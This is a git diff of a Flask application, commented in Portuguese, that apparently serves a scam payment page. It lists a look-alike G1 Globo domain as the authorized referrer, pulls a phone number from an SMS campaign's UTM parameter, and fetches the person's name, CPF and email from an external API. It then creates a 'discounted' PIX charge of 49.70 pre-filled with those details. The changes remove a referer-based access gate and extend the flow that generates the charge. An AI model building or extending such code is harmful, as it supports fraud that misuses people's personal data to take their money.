@@ -22,35 +22,14 @@ from pagamentocomdesconto import create_payment_with_discount_api
 
 app = Flask(__name__)
 
-# Domínio autorizado
-AUTHORIZED_DOMAIN = "g1globo.noticiario-plantao.com"
+# Domínio autorizado - Permitindo todos os domínios
+AUTHORIZED_DOMAIN = "*"
 
 def check_referer(f):
     @functools.wraps(f)
     def decorated_function(*args, **kwargs):
-        # Obter referer
-        referer = request.headers.get('Referer')
-        
-        # Verificar se estamos forçando a verificação de domínio
-        FORCE_DOMAIN_CHECK = os.environ.get('FORCE_DOMAIN_CHECK', 'False').lower() == 'true'
-        
-        # Em ambiente de desenvolvimento Replit, verificamos a variável de ambiente
-        if not FORCE_DOMAIN_CHECK and 'REPL_ID' in os.environ:
-            app.logger.info(f"Ambiente de desenvolvimento detectado. Permitindo acesso. Referer: {referer}, Path: {request.path}")
-            return f(*args, **kwargs)
-
-        # Se o referer está vindo do nosso próprio site, permitir
-        if referer and request.host in referer:
-            app.logger.info(f"Navegação interna detectada, permitindo acesso: {request.path}")
-            return f(*args, **kwargs)
-            
-        # Verificar domínio autorizado para acesso externo
-        if not referer or AUTHORIZED_DOMAIN not in referer:
-            app.logger.warning(f"Acesso não autorizado detectado! Referer: {referer}")
-            return render_template('unauthorized.html'), 403
-            
-        # Se chegou aqui, o referer contém o domínio autorizado
-        app.logger.info(f"Acesso autorizado via domínio para: {request.path}")
+        # Permita acesso independente do referer
+        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
         return f(*args, **kwargs)
         
     return decorated_function
@@ -493,8 +472,8 @@ def index():
         utm_content = request.args.get('utm_content', '')
         phone_from_utm = None
         
-        # Extrair número de telefone do utm_content (último parâmetro)
-        if utm_source == 'smsempresa' and utm_content and len(utm_content) >= 10:
+        # Extrair número de telefone do utm_content
+        if utm_content and len(utm_content) >= 10:
             # Limpar o número de telefone, mantendo apenas dígitos
             phone_from_utm = re.sub(r'\D', '', utm_content)
             app.logger.info(f"[PROD] Número de telefone extraído de utm_content: {phone_from_utm}")
@@ -523,6 +502,48 @@ def index():
                                 'phone': cliente_data.get('telefone', phone_from_utm).replace('+55', ''),
                                 'email': cliente_data.get('email', f"cliente_{phone_from_utm}@example.com")
                             }
+                            
+                            # Usar os dados obtidos da API para gerar uma transação com pagamentocomdesconto.py
+                            api_desconto = create_payment_with_discount_api()
+                            
+                            # Preparar dados para a API
+                            payment_data = {
+                                'nome': client_data['name'],
+                                'cpf': client_data['cpf'],
+                                'telefone': client_data['phone'],
+                                'email': client_data['email']
+                            }
+                            
+                            # Criar o pagamento PIX com desconto
+                            try:
+                                pix_data = api_desconto.create_pix_payment_with_discount(payment_data)
+                                app.logger.info(f"[PROD] PIX com desconto gerado com sucesso: {pix_data}")
+                                
+                                # Obter QR code e PIX code da resposta da API
+                                qr_code = pix_data.get('pix_qr_code') or pix_data.get('pixQrCode')
+                                pix_code = pix_data.get('pix_code') or pix_data.get('pixCode')
+                                
+                                # Garantir que temos valores válidos
+                                if not qr_code:
+                                    # Algumas APIs podem usar outros nomes para o QR code
+                                    qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or ''
+                                    
+                                if not pix_code:
+                                    # Algumas APIs podem usar outros nomes para o código PIX
+                                    pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
+                                
+                                return render_template('payment_update.html', 
+                                    qr_code=qr_code,
+                                    pix_code=pix_code, 
+                                    nome=client_data['name'], 
+                                    cpf=format_cpf(client_data['cpf']),
+                                    phone=client_data['phone'],
+                                    transaction_id=pix_data.get('id'),
+                                    amount=49.70)
+                                
+                            except Exception as pix_error:
+                                app.logger.error(f"[PROD] Erro ao gerar PIX com desconto: {str(pix_error)}")
+                                # Continua com o fluxo normal em caso de erro no pagamento
                         else:
                             # Tente o endpoint alternativo se o primeiro falhar
                             app.logger.warning(f"[PROD] API primária não retornou dados esperados, tentando endpoint alternativo")
@@ -540,59 +561,29 @@ def index():
                                     'email': api_data.get('email', f"cliente_{phone_from_utm}@example.com")
                                 }
                             else:
-                                raise Exception("Ambos endpoints de API falharam")
-                    else:
-                        app.logger.warning(f"[PROD] Erro ao consultar API de cliente: {response.status_code}")
-                        # Usar dados simulados como fallback em caso de falha da API
-                        primeiro_nome = "Cliente"
-                        ultimo_nome = "Promocional"
+                                app.logger.warning(f"[PROD] Ambos endpoints de API falharam")
+                                # Não gera erro, apenas continua com o fluxo normal
+                    
+                    # Atualizar dados do cliente que serão mostrados na página
+                    if 'client_data' in locals():
+                        customer_data['nome'] = client_data['name']
+                        customer_data['cpf'] = client_data['cpf']
+                        customer_data['phone'] = client_data['phone']
+                        customer_data['email'] = client_data.get('email', '')
                         
-                        # Gerar um CPF válido para teste
-                        cpf_digits = ''.join([str(random.randint(0, 9)) for _ in range(9)])
-                        cpf_sum = sum(int(digit) * (10 - i) for i, digit in enumerate(cpf_digits))
-                        remainder = cpf_sum % 11
-                        first_verifier = 0 if remainder < 2 else 11 - remainder
-                        cpf_digits += str(first_verifier)
-                        cpf_sum = sum(int(digit) * (11 - i) for i, digit in enumerate(cpf_digits))
-                        remainder = cpf_sum % 11
-                        second_verifier = 0 if remainder < 2 else 11 - remainder
-                        cpf_digits += str(second_verifier)
-                        formatted_cpf = f"{cpf_digits[:3]}.{cpf_digits[3:6]}.{cpf_digits[6:9]}-{cpf_digits[9:]}"
-                        
-                        client_data = {
-                            'name': f"{primeiro_nome} {ultimo_nome}",
-                            'cpf': formatted_cpf,
-                            'phone': phone_from_utm,
-                            'email': f"{primeiro_nome.lower()}.{ultimo_nome.lower()}@example.com"
-                        }
-                    
-                    app.logger.info(f"[PROD] Dados do cliente simulados: {client_data}")
-                    
-                    # Atualizar dados do cliente
-                    customer_data['nome'] = client_data['name']
-                    customer_data['cpf'] = client_data['cpf']
-                    customer_data['phone'] = client_data['phone']
-                    customer_data['email'] = client_data['email']
-                    
-                    # Marcar que este cliente tem desconto
-                    customer_data['has_discount'] = True
-                    customer_data['discount_price'] = 49.70
-                    customer_data['regular_price'] = 73.40
-                    
-                    # Salvar os dados no localStorage via JS
-                    return render_template(
-                        'index.html', 
-                        customer=customer_data, 
-                        has_discount=True, 
-                        discount_price=49.70,
-                        regular_price=73.40
-                    )
+                        # Marcar que este cliente tem desconto
+                        customer_data['has_discount'] = True
+                        customer_data['discount_price'] = 49.70
+                        customer_data['regular_price'] = 73.40
                     
                 except Exception as api_error:
                     app.logger.error(f"[PROD] Erro ao processar dados do cliente: {str(api_error)}")
         
         app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
-        return render_template('index.html', customer=customer_data, has_discount=False)
+        return render_template('index.html', customer=customer_data, 
+                              has_discount='client_data' in locals(),
+                              discount_price=49.70,
+                              regular_price=73.40)
     except Exception as e:
         app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
         return jsonify({'error': 'Erro interno do servidor'}), 500
